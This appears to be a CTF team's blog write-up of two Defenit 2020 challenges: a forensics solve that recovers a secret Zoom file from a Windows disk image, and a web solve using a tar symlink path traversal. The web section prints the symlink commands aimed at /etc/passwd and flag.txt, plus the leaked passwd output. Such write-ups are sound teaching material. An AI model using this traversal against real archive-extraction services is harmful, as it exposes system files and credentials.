@@ -1,0 +1,139 @@
+I"�<p>I played with CTF.SG last weekend and we achieved 10th in the rankings although we didn’t even solve a single pwn!</p>
+
+<hr />
+
+<h1 id="find-tangential-cipher">Find Tangential Cipher</h1>
+
+<h4 id="category-forensics--3-solves--857-points">Category: Forensics | 3 solves | 857 points</h4>
+
+<p>We first-blooded this challenge thanks to my teammate Kenneth!</p>
+
+<p>We are given a <a href="https://drive.google.com/drive/folders/1oQYvJnbOou5TUXaV1ApoQnP6S_Vj8pbI">Google Drive link</a> with 9 files, named <code class="language-plaintext highlighter-rouge">Evidence.E01-8</code> and <code class="language-plaintext highlighter-rouge">Evidence.E01.txt</code>. The total file size is about 12 GB, so please check the link (if it is still alive) if  you want to try the question.</p>
+
+<p>From the txt file, we can figure out that it’s a physical image of a Windows system.</p>
+
+<p>Opening up the image for browsing, we are greeted with different volumes.</p>
+
+<p><img src="/assets/defenit-2020/forensics/find-tangential-cipher/vol-partitions.png" alt="Volume Partitions" /></p>
+
+<p>We tried them in order, starting from the first Basic data partition (vol 4) and finding that it’s got nothing interesting.</p>
+
+<p><img src="/assets/defenit-2020/forensics/find-tangential-cipher/vol-4-partition.png" alt="Volume 4" /></p>
+
+<p>Moving on to the next basic data partition on vol 7, we find something we’re much more acquainted with - the <code class="language-plaintext highlighter-rouge">C:\</code> Drive Windows Filesystem!</p>
+
+<p><img src="/assets/defenit-2020/forensics/find-tangential-cipher/vol-7-partition.png" alt="Volume 7" /></p>
+
+<p>Browsing around, we started with Appdata, going down the Default (skeleton) user and all the way down to <code class="language-plaintext highlighter-rouge">/User/secre</code> which seems to be the main user on this machine. We find many files, but nothing too interesting - until we reached the end of Appdata. There was this Zoom database where the <code class="language-plaintext highlighter-rouge">firstName:lastName</code> of a user was <code class="language-plaintext highlighter-rouge">man:suspect</code>.</p>
+
+<p><img src="/assets/defenit-2020/forensics/find-tangential-cipher/zoom-suspect-man.png" alt="Zoom-Man-Suspect" /></p>
+
+<p>We knew we were up to something now.</p>
+
+<p>Moving on to the next db in the same folder, we found the message log in the first table of the db. As you can see in the image below, it goes like this:</p>
+
+<p><img src="/assets/defenit-2020/forensics/find-tangential-cipher/zoom-tangential-file.png" alt="Zoom-Tangential-Hint" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Hello
+Long Time No See
+We're dealing with weapons
+I want you to go to the meeting place and get it yourself.
+The Tangential Cipher is in the File.
+Then, I'll ask you.
+</code></pre></div></div>
+
+<p>The next db file only showed the xmpp id, so we skipped that.</p>
+
+<p>However, going back to the first db in the folder, in the <code class="language-plaintext highlighter-rouge">zoom_mm_file</code> table, we found a <code class="language-plaintext highlighter-rouge">url</code> column that looked suspiciously like the <code class="language-plaintext highlighter-rouge">objkey</code> in a Zoom download link.</p>
+
+<p><img src="/assets/defenit-2020/forensics/find-tangential-cipher/zoom-file-id.png" alt="Zoom-File-ID" /></p>
+
+<p>Putting that together into a link, we get a file shown below (I think <code class="language-plaintext highlighter-rouge">zfk</code> is my token so I’m not pasting the link here)</p>
+
+<p><img src="/assets/defenit-2020/forensics/find-tangential-cipher/zoom-file-binary.png" alt="Zoom-File-Binary" /></p>
+
+<p>As the table mentioned that it was a <code class="language-plaintext highlighter-rouge">Secret.docx</code> file, we use <code class="language-plaintext highlighter-rouge">curl -o flag.docx &lt;URL&gt;</code> to download it and open it in Microsoft Word.</p>
+
+<p>And we got the flag!</p>
+
+<p><img src="/assets/defenit-2020/forensics/find-tangential-cipher/flag.png" alt="Flag" /></p>
+
+<details>
+  <summary>FLAG</summary>
+  
+  `Mr_K_1_W@nT_Cola!!`
+</details>
+
+<hr />
+
+<h1 id="tar-analyzer">Tar Analyzer</h1>
+
+<h4 id="category-web--278-points">Category: Web | 278 points</h4>
+
+<h4 id="description">Description</h4>
+<p>Our developer built simple web server for analyzing tar file and extracting online. He said server is super safe. Is it?</p>
+
+<h4 id="server">Server</h4>
+<p>http://tar-analyzer.ctf.defenit.kr:8080/</p>
+
+<h4 id="attachments">Attachments</h4>
+<p><a href="tar-analyzer.tar.gz">tar-analyzer.tar.gz</a></p>
+
+<hr />
+
+<p>We found the unintended solution for this.</p>
+
+<p>Using the symbolic link vector, a common zip file unpacking vulnerability, we first tried to read the <code class="language-plaintext highlighter-rouge">/etc/passwd</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ln -s ../../../etc/passwd aaa
+tar -cvf test.tar aaa
+</code></pre></div></div>
+
+<p>This returns the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> on the server as follows.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root:x:0:0:root:/root:/bin/ash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+news:x:9:13:news:/usr/lib/news:/sbin/nologin
+uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
+operator:x:11:0:operator:/root:/bin/sh
+man:x:13:15:man:/usr/man:/sbin/nologin
+postmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin
+cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
+ftp:x:21:21::/var/lib/ftp:/sbin/nologin
+sshd:x:22:22:sshd:/dev/null:/sbin/nologin
+at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
+squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
+xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
+games:x:35:35:games:/usr/games:/sbin/nologin
+postgres:x:70:70::/var/lib/postgresql:/bin/sh
+cyrus:x:85:12::/usr/cyrus:/sbin/nologin
+vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
+ntp:x:123:123:NTP:/var/empty:/sbin/nologin
+smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
+guest:x:405:100:guest:/dev/null:/sbin/nologin
+nobody:x:65534:65534:nobody:/:/sbin/nologin
+analyzer:x:1000:1000:Linux User,,,:/home/analyzer:
+</code></pre></div></div>
+
+<p>Hence we tried to guess the filename, starting with the common <code class="language-plaintext highlighter-rouge">flag.txt</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ln -s ../../../flag.txt aaa
+tar -cvf test.tar aaa
+</code></pre></div></div>
+
+<p>And done! We got the flag just like that.</p>
+
+<details>
+  <summary>FLAG</summary>
+  
+  `Defenit{R4ce_C0nd1710N_74r_5L1P_w17H_Y4ML_Rce!}`
+</details>
+
+:ET
